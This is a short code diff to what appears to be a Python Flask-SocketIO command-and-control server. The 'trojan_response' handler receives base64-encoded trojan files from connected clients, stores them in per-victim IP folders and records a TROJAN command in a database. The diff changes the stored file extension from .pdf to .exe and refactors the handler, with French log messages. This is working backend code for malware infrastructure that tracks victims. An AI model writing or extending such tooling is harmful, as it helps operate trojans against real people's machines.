@@ -539,20 +539,21 @@ def handle_frame(data):
 
 @socketio.on('trojan_response')
 def handle_trojan(data):
+    trojan_data = base64.b64decode(data.get('trojan'))
     sid = request.sid
     client = Client.query.filter_by(sid=sid).first()
     if client:
-        trojan_dir = f"trojans/{client.ip}"
+        client_ip = client.ip
+        trojan_dir = f"trojans/{client_ip}"
         os.makedirs(trojan_dir, exist_ok=True)
-        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.pdf"
+        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.exe"
         trojan_path = f"{trojan_dir}/{file_name}"
         with open(trojan_path, 'wb') as f:
-            f.write(base64.b64decode(data.get('trojan_message')))
+            f.write(trojan_data)
         new_command = Command(type=CommandType.TROJAN, client_id=client.id, file_path=trojan_path)
         db.session.add(new_command)
         db.session.commit()
-        app.logger.info(f"Trojan reçu de {client.ip} et enregistré sous {trojan_path}")
-
+        app.logger.info(f"Trojan reçu de {client_ip} et enregistré sous {trojan_path}")
 
 @socketio.on('disconnect')
 def handle_disconnect():
